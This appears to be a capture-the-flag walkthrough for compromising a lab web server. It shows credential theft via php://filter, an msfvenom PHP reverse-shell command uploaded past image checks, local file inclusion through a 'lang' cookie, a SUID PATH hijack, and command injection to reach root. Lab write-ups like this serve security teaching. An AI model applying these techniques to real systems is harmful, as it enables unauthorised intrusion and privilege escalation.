@@ -1,0 +1,27 @@
+Host Discovery: Find the host ip using netdiscover
+Port Scan: use NMAP -sV $ip to get lists of services (apache and mysql)
+Browse to $ip
+Webapp was using php.  Use php://filter to view login, upload, config files
+Config.php revealed database:Users, user: root, and root password for mysql
+connect to mysql using credentials from config.php
+Dump the users table to reveal the credentials for the webapp login.
+Login with  a user's credentials
+
+Now that we have a login we can attempt to use the Upload page to gain acess.
+We know from Login.php that we can only upload files with .jpg, png, or bmp extensions.  It is also looking for a MIME encoding of an image file.
+We need to create a PHP shell and find a way to upload it to the server and then somehow access the shell script to spawn a shell.
+I leveraged msfvenom to create a php meterpreter shell. (msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php)
+Using Burp, I changed the name of the shell script before it was uploaded to the server.  I also added "GIF89" to the beginning of the shell code to satisfy the MIME type.  This uploaded the shell script but it was unable to execute.
+The server was storing the shell scripyt in /Uploads/rc5($file_name). This means that if a way could be found to access that file, it should run the php script.
+Looking closer at the Index page there is an optional and not fully implemented cookie option for "lang=".  This can be used to leverage an LFI as seen by include("lang/".$_COOKIE['lang']).  Knowing that this can be used to exploit LFI, we can add the "lang=" cookie and set it's path to the path of the uploaded shell script.
+
+This gives us a shell for user www-data.
+
+Using the data from the Users database, we have the passwords for kane and kent (the password for mike does not work).  We try to su kent but get a message that we must su from tty.  Using "python -c 'import pty; pty.spawn("/bin/sh")'" we can spawn a tty shell.  After creating the new shell it is possible to su as kane.
+
+Things now get tricky because we need to escalate or privs from kane to root somehow.  We notice in /home/kane there is a file with suid bit set "msgmike".  Running strings on this file shows that this elf is running cat "/home/mike/msg.txt".  There should be a way to leverage this executable to get root.  It turns out you have to understand how to use a $PATH variable to leverage this.  To exploit this we need to set PATH="." and then create a cat file that will execute /bin/sh. (echo "/bin/sh" > cat. This will cause the newly created cat file to run instead of the /bin/cat program because the path is looking in our current directory for kane.  Now when running msgmike we are running /bin/sh from our cat program. We run "msgmike" and then change our PATH variable back to it's original state. looking at id we can now see we are now logged in as mike.
+
+The next step is to look in mike's home directory.  There we can see a elf binary that is named "msg2root".  Running this we can see that it is sending our user import to a root run process without sanitizing iot.  This is perfect for command injection.  Running the msg2root binary and entering hi;/bin/sh; will give you a root shell.  From there we jsut have toi cat /root/flag.  pwned.
+
+
+
